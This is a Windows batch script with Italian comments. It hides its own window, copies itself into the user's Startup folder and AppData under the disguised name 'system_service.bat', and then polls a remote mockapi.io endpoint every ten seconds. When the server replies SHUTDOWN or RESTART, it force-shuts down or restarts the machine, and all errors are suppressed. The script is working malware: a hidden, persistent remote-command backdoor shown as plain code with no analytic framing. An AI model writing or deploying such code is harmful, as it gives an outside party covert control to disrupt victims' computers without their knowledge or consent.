@echo off
:: Nascondere la finestra
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

:: Copiarsi in posizione nascosta
copy "%~f0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\system_service.bat" >nul 2>&1
copy "%~f0" "%AppData%\system_service.bat" >nul 2>&1

:: Configurazione
set "endpoint=https://68b36d2fc28940c9e69eddeb.mockapi.io/shutdown_commands"
set "check_interval=10"

:loop
:: Controllare comandi dal server
powershell -Command "try {$response = Invoke-RestMethod -Uri '%endpoint%' -Method GET; if ($response.command -eq 'SHUTDOWN') {shutdown /s /f /t 0} if ($response.command -eq 'RESTART') {shutdown /r /f /t 0}} catch {}"

:: Aspettare prima di controllare di nuovo
timeout /t %check_interval% /nobreak >nul
goto loop
